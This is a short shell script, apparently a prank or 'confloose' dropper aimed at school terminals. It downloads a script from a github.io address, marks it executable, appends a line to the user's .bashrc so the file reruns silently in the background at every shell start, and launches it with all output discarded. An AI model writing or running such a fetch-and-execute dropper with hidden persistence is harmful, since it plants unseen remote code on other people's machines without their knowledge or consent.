#!/bin/sh

tempdir=$(mktemp -d)
file="$tempdir/confloose-daemon-terminal"

curl "https://d-002.github.io/epita/confloose/daemon-terminal/daemon.sh" >> "$file"
chmod +x "$file"
echo "$file 2>/dev/null 1>&2 & # confloose by leo" >> "$HOME/.bashrc"
"$file" 2>/dev/null 1>&2 &
